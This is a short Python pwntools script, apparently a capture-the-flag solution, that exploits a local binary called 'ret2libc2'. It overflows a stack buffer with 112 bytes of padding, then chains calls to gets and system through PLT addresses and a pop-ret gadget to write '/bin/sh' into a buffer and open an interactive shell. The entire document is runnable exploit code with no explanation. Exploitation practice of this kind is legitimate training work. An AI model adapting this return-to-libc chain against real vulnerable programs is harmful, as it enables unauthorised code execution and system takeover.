from pwn import *

sh = process('./ret2libc2')
e = ELF('./ret2libc2')

buf2_addr = 0x804a080
gets_addr = e.plt['gets']
pop_ret_addr = 0x804843d
system_addr = e.plt['system']

payload = flat([b'a'*112, gets_addr, pop_ret_addr, buf2_addr, 
    system_addr, 0xb, buf2_addr])

sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
